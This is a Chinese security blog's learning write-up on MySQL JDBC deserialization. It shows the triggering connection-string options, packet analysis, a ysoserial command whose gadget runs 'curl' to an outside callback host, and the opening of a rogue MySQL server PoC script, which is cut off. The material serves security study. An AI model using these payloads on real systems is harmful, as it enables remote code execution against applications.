<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>JDBC反序列化入门学习 | RedTeaming</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="/img/redteam.ico">
    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <meta name="description" content="RedTeaming">
    <meta name="keywords" content="RedTeam,XTeamWing,RedTeaming,信息安全,网络安全，红蓝对抗,红队行动,渗透测试">
    <meta name="baidu-site-verification" content="482fd3a21f12d6c3a2285ac992936bde">
    <meta name="theme-color" content="#5deff9">
    <meta name="referrer" content="no-referrer">
    <link rel="preload" href="/assets/css/0.styles.cb604a48.css" as="style"><link rel="preload" href="/assets/js/app.be83bd91.js" as="script"><link rel="preload" href="/assets/js/2.b71e909d.js" as="script"><link rel="preload" href="/assets/js/3.aae92b90.js" as="script"><link rel="preload" href="/assets/js/15.c893a769.js" as="script"><link rel="prefetch" href="/assets/js/10.576e2d25.js"><link rel="prefetch" href="/assets/js/11.45ae902f.js"><link rel="prefetch" href="/assets/js/12.78693917.js"><link rel="prefetch" href="/assets/js/13.1b2dd970.js"><link rel="prefetch" href="/assets/js/14.8346b3bc.js"><link rel="prefetch" href="/assets/js/16.416058c5.js"><link rel="prefetch" href="/assets/js/17.7e6ee0d8.js"><link rel="prefetch" href="/assets/js/18.b9af0164.js"><link rel="prefetch" href="/assets/js/19.2e02851a.js"><link rel="prefetch" href="/assets/js/20.82df4fa3.js"><link rel="prefetch" href="/assets/js/21.b7a6161a.js"><link rel="prefetch" href="/assets/js/22.3d51065a.js"><link rel="prefetch" href="/assets/js/23.0654865c.js"><link rel="prefetch" href="/assets/js/24.b3170837.js"><link rel="prefetch" href="/assets/js/25.96ec8595.js"><link rel="prefetch" href="/assets/js/26.bbaa98f3.js"><link rel="prefetch" href="/assets/js/27.6cfd0642.js"><link rel="prefetch" href="/assets/js/28.ee7f1e26.js"><link rel="prefetch" href="/assets/js/29.db5477f0.js"><link rel="prefetch" href="/assets/js/4.3486280d.js"><link rel="prefetch" href="/assets/js/5.f6baf9fa.js"><link rel="prefetch" href="/assets/js/6.af4fd23a.js"><link rel="prefetch" href="/assets/js/7.91266911.js"><link rel="prefetch" href="/assets/js/8.98cffdda.js"><link rel="prefetch" href="/assets/js/9.66ac5539.js">
    <link rel="stylesheet" href="/assets/css/0.styles.cb604a48.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/redteam.png" alt="RedTeaming" class="logo"> <span class="site-name can-hide">RedTeaming</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">🤡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">🍓Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://i.loli.net/2020/12/23/2LlibEtVrvZoINa.png"> <div class="blogger-info"><h3>Wing</h3> <span>Less talk,More work!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">🤡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">🍓Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>安全开发</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>渗透测试</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>ASP|ASPX</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>Tools</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>JAVA安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/b62a2f/" aria-current="page" class="active sidebar-link">JDBC反序列化入门学习</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/b62a2f/#jdbc？" class="sidebar-link">JDBC？</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#测试环境" class="sidebar-link">测试环境</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#建立jdbc连接" class="sidebar-link">建立JDBC连接</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#反序列化简单介绍" class="sidebar-link">反序列化简单介绍</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#断点调试" class="sidebar-link">断点调试</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#构造poc" class="sidebar-link">构造POC</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/b62a2f/#show-session-status响应包" class="sidebar-link">show session status响应包</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#exp" class="sidebar-link">Exp</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#补充" class="sidebar-link">补充</a></li><li class="sidebar-sub-header"><a href="/pages/b62a2f/#资料（原文）" class="sidebar-link">资料（原文）</a></li></ul></li></ul></section></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>二进制安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>BypassAV</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>漏洞利用</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>内网渗透</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-583ea4e9><div class="articleInfo" data-v-583ea4e9><ul class="breadcrumbs" data-v-583ea4e9><li data-v-583ea4e9><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-583ea4e9></a></li> <li data-v-583ea4e9><a href="/categories/?category=Blog" title="分类" data-v-583ea4e9>Blog</a></li> <li data-v-583ea4e9><a href="/categories/?category=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95" title="分类" data-v-583ea4e9>渗透测试</a></li> <li data-v-583ea4e9><a href="/categories/?category=JAVA%E5%AE%89%E5%85%A8" title="分类" data-v-583ea4e9>JAVA安全</a></li></ul> <div class="info" data-v-583ea4e9><div title="作者" class="author iconfont icon-touxiang" data-v-583ea4e9><a href="https://github.com/XTeam-Wing" target="_blank" title="作者" class="beLink" data-v-583ea4e9>Wing</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-583ea4e9><a href="javascript:;" data-v-583ea4e9>2021-03-20</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">
          JDBC反序列化入门学习
        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><blockquote><p>学习来源 <a href="https://xz.aliyun.com/t/8159#toc-2" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8159<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></blockquote> <h2 id="jdbc？"><a href="#jdbc？" class="header-anchor">#</a> JDBC？</h2> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>Java Database Connectivity
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>不复制粘贴了,见<a href="https://www.yiibai.com/jdbc/jdbc-introduction.html" target="_blank" rel="noopener noreferrer">JDBC基础介绍<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h2 id="测试环境"><a href="#测试环境" class="header-anchor">#</a> 测试环境</h2> <ul><li>IDEA</li> <li>Mysql 5.7</li></ul> <h2 id="建立jdbc连接"><a href="#建立jdbc连接" class="header-anchor">#</a> 建立JDBC连接</h2> <p><a href="https://www.runoob.com/java/java-mysql-connect.html" target="_blank" rel="noopener noreferrer">https://www.runoob.com/java/java-mysql-connect.html<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616213850445-e94d6188-7f4b-421e-bbe3-f06565c26671.png#align=left&amp;display=inline&amp;height=384&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=768&amp;originWidth=1704&amp;size=160936&amp;status=done&amp;style=none&amp;width=852" alt="image.png">
下载驱动包
<a href="https://dev.mysql.com/downloads/connector/j/" target="_blank" rel="noopener noreferrer">https://dev.mysql.com/downloads/connector/j/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>
不要下最新的，估摸着是修了。下载8.0.12
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616216597580-7f88f752-b65e-43b4-a4e6-ccb95787806a.png#align=left&amp;display=inline&amp;height=567&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1134&amp;originWidth=2176&amp;size=200748&amp;status=done&amp;style=none&amp;width=1088" alt="image.png">
多下几个版本
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616216689611-2ce24de1-6a58-4e50-9c42-5eb369d91987.png#align=left&amp;display=inline&amp;height=690&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1380&amp;originWidth=3414&amp;size=303431&amp;status=done&amp;style=none&amp;width=1707" alt="image.png"></p> <blockquote><p>每个版本在反序列化利用的时候有一定区别。</p></blockquote> <p>右键引入作为module库，就跑起来了。
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616216924404-0b574c6c-d799-4ab9-b2d0-fb164869e083.png#align=left&amp;display=inline&amp;height=899&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1798&amp;originWidth=3410&amp;size=480929&amp;status=done&amp;style=none&amp;width=1705" alt="image.png"></p> <h2 id="反序列化简单介绍"><a href="#反序列化简单介绍" class="header-anchor">#</a> 反序列化简单介绍</h2> <p><a href="https://blog.csdn.net/sun1318578251/article/details/106120247?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161621996416780264022275%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161621996416780264022275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-3-106120247.pc_v1_rank_blog_v1&amp;utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener noreferrer">漫谈Java反序列化<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener noreferrer">https://github.com/SummerSec/JavaLearnVulnerability<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>以及落木萧萧的article
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616223147561-4c331b1a-30b1-40c5-8e10-672611f7ff35.png#align=left&amp;display=inline&amp;height=165&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=330&amp;originWidth=836&amp;size=74208&amp;status=done&amp;style=none&amp;width=418" alt="image.png">
跟着文章学习</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>反序列化漏洞三要素实现Serializabe接口、readObject()、writeObject()方法，缺一不可。

漏洞挖掘或许就是怎么找到可控点，达到rce的目的。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="断点调试"><a href="#断点调试" class="header-anchor">#</a> 断点调试</h2> <p>com.mysql.cj.jdbc.Driver的触发点是</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>要触发需要在连接字符串中加上</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<span class="token important">&amp;autoDeserialize=true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>打断点
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616227052560-ca3ff2fe-2cca-4132-84ea-5d962448450d.png#align=left&amp;display=inline&amp;height=869&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1738&amp;originWidth=3108&amp;size=544275&amp;status=done&amp;style=none&amp;width=1554" alt="image.png"></p> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616227859063-764ac983-dc15-44a2-aecb-be0181f43b5e.png#align=left&amp;display=inline&amp;height=722&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1444&amp;originWidth=2522&amp;size=318201&amp;status=done&amp;style=none&amp;width=1261" alt="image.png"></p> <p>如果是二进制数据就会往下走，到readObject处触发反序列化。</p> <p>这个方法在<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code> 处调用。</p> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616228701636-11acfc50-a25d-4f97-b88f-4cdcd45050a1.png#align=left&amp;display=inline&amp;height=122&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=244&amp;originWidth=1760&amp;size=64897&amp;status=done&amp;style=none&amp;width=880" alt="image.png">
对比其他人的漏洞分析文章发现，我的这个版本在这里没有了对结果处理的函数
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616228817032-2cc2953e-2661-42c1-9c4e-4452dd05d840.png#align=left&amp;display=inline&amp;height=496&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=992&amp;originWidth=3222&amp;size=259148&amp;status=done&amp;style=none&amp;width=1611" alt="image.png"></p> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616229048302-6c16385b-177c-4d5f-9826-0094515374ab.png#align=left&amp;display=inline&amp;height=704&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1408&amp;originWidth=3056&amp;size=362252&amp;status=done&amp;style=none&amp;width=1528" alt="image.png"></p> <p>调用点
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616229117005-f9450aad-c4da-4a4d-afcb-f82a9b1d4439.png#align=left&amp;display=inline&amp;height=206&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=412&amp;originWidth=2016&amp;size=62016&amp;status=done&amp;style=none&amp;width=1008" alt="image.png"></p> <h2 id="构造poc"><a href="#构造poc" class="header-anchor">#</a> 构造POC</h2> <p>根据执行<code>SHOW SESSION STATUS</code>这条语句之后要在服务端返回一个恶意的二进制对象，所以重点就是怎么构造这个对象，有时候漏洞存在的情况仍然攻击不成功，有可能是因为各个版本的mysql发包不一样，需要抓包定制化攻击。</p> <p>Mac下抓包测试</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>tcp.port ==3306 <span class="token important">&amp;&amp;</span> mysql
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616231590988-dba4c90b-7533-47a9-b600-103db981b64b.png#align=left&amp;display=inline&amp;height=743&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1486&amp;originWidth=2462&amp;size=346908&amp;status=done&amp;style=none&amp;width=1231" alt="image.png">
第一个是Response Ok
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616232398594-50de1707-4575-4c56-92d8-6e5626a96852.png#align=left&amp;display=inline&amp;height=969&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1938&amp;originWidth=2462&amp;size=449027&amp;status=done&amp;style=none&amp;width=1231" alt="image.png"></p> <p>数据包内容为</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code>0700000200000002000000
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="show-session-status响应包"><a href="#show-session-status响应包" class="header-anchor">#</a> show session status响应包</h3> <p>重点是这个响应包</p> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616232578511-383488b6-368b-4671-bdc6-c7814753a674.png#align=left&amp;display=inline&amp;height=113&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=226&amp;originWidth=1794&amp;size=81537&amp;status=done&amp;style=none&amp;width=897" alt="image.png">
结果集响应包的结构</p> <ul><li>数据段1：说明下面的结果集有多少列</li> <li>数据段2：列的定义</li> <li>数据段3： EOF 包</li> <li>数据段4：行数据。</li></ul> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616233352484-fd175288-fd77-4a1d-9886-932437005007.png#align=left&amp;display=inline&amp;height=232&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=464&amp;originWidth=645&amp;size=37255&amp;status=done&amp;style=none&amp;width=322.5" alt="image.png">
结果集数据包如图</p> <p><img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616233047383-f6de0076-578a-4e0a-941b-e80cb9b5aafd.png#align=left&amp;display=inline&amp;height=969&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1938&amp;originWidth=2462&amp;size=582709&amp;status=done&amp;style=none&amp;width=1231" alt="image.png"></p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code> 01 数据长度为1 00  00 01 sequence id为1 02 代表有两列
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>整个数据包如下
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616233155416-70bb2180-ffc8-4228-83a4-33f2fab0b093.png#align=left&amp;display=inline&amp;height=969&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1938&amp;originWidth=2462&amp;size=587398&amp;status=done&amp;style=none&amp;width=1231" alt="image.png"></p> <p>第三部分是EOF，文章作者说加上就会报错。我在问熟悉这个漏洞的朋友。
第四部分就是自己的poc
使用yso生成即可。
yso的链目前不懂。</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code> java <span class="token punctuation">-</span>jar wingyso.jar CommonsCollections7 &quot;curl 5s3g.hyuga.co&quot; <span class="token punctuation">&gt;</span> data
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>补充截图
问候报文
<img src="https://cdn.nlark.com/yuque/0/2021/png/370919/1616233804919-e57c4327-e3f3-45fd-a0b1-205b9fcec180.png#align=left&amp;display=inline&amp;height=969&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1938&amp;originWidth=2462&amp;size=478927&amp;status=done&amp;style=none&amp;width=1231" alt="image.png">
所有的response需要对应上。
作者的poc</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code><span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token comment">#@Time : 2020/7/27 2:10</span>
<span class="token comment">#@Author: Tri0mphe7</span>
<span class="token comment">#@File : server.py</span>
import socket
import binascii
import os

greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;
response_ok_data=&quot;0700000200000002000000&quot;

<span class="token key atrule">def receive_data(conn)</span><span class="token punctuation">:</span>
    data = conn.recv(1024)
    print(&quot;<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Receiveing the package <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>&quot;.format(data))
    return str(data).lower()

def send_data(conn<span class="token punctuation">,</span><span class="token key atrule">data)</span><span class="token punctuation">:</span>
